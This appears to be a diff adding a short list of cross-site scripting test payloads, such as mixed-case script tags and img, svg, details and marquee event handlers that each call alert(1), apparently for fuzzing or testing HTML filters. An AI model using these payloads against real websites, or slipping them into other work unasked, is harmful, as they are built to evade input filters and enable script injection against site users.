@@ -1,0 +1,8 @@
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<img src=1 onerror=alert(1)>
+<svg/onload=alert(1)>
+<details/open/ontoggle=alert(1)>
+<marquee/onstart=alert(1)>
